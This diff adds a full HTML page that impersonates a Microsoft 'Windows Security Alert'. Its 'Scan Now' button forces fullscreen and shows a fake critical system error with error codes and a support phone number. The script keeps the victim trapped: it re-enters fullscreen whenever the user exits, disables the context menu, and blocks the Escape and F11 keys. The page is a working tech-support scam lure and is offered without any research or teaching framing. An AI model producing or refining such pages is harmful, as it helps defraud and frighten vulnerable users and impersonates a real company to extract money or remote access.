@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Security Alert</title>
+    <style>
+        :root {
+            --ms-blue: #0078D4;
+            --ms-gray: #F3F3F3;
+            --error-red: #E81123;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", system-ui, sans-serif;
+            overflow: hidden;
+            color: #000;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            position: relative;
+        }
+
+        .background-image {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://wallpaperaccess.com/full/4704271.jpg');
+            background-size: cover;
+            background-position: center;
+            filter: blur(8px) brightness(0.7);
+            z-index: 0;
+        }
+
+        .dialog-container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 40px 60px;
+            border-radius: 8px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+            z-index: 1;
+            max-width: 600px;
+            border: 1px solid #ddd;
+            backdrop-filter: blur(4px);
+        }
+
+        .windows-logo {
+            position: absolute;
+            top: 30px;
+            right: 40px;
+            width: 120px;
+            z-index: 2;
+        }
+
+        .alert-icon {
+            width: 80px;
+            margin-bottom: 25px;
+        }
+
+        .scan-button {
+            background: var(--ms-blue);
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 4px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: filter 0.2s;
+            margin: 25px 0;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .scan-button:hover {
+            filter: brightness(1.1);
+        }
+
+        .error-message {
+            display: none;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .support-section {
+            margin-top: 30px;
+            padding-top: 25px;
+            border-top: 1px solid #eee;
+        }
+
+        .support-number {
+            color: var(--error-red);
+            font-weight: 600;
+            text-decoration: none;
+            display: block;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="background-image"></div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" 
+         class="windows-logo" 
+         alt="Microsoft Logo">
+
+    <div class="dialog-container">
+        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23E81123' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E" 
+             class="alert-icon" 
+             alt="Alert Icon">
+
+        <button class="scan-button" id="scanBtn">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="white">
+                <path d="M20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69zM12 18c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6zm0-10c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4z"/>
+            </svg>
+            Scan Now
+        </button>
+
+        <div class="error-message" id="errorMessage">
+            <h2 style="color: var(--error-red); margin: 0 0 15px 0;">Critical System Error</h2>
+            <p style="margin: 10px 0;">
+                Your PC ran into a problem and needs to restart.<br>
+                We're collecting some error info, and then we'll restart for you.<br><br>
+                Error code: 0x0000007B<br>
+                Status: 0xC0000034
+            </p>
+
+            <div class="support-section">
+                <a href="tel:+18009009999" class="support-number">
+                    ☎ Contact Support: +1 (800) 900-9999
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function handleScan() {
+            document.documentElement.requestFullscreen()
+                .then(() => {
+                    document.getElementById('scanBtn').style.display = 'none';
+                    document.getElementById('errorMessage').style.display = 'block';
+                })
+                .catch(() => {
+                    alert('Full screen required to continue');
+                });
+        }
+
+        document.getElementById('scanBtn').addEventListener('click', handleScan);
+
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            }
+        });
+
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F11' || e.key === 'Escape') e.preventDefault();
+        });
+    </script>
+</body>
+</html>
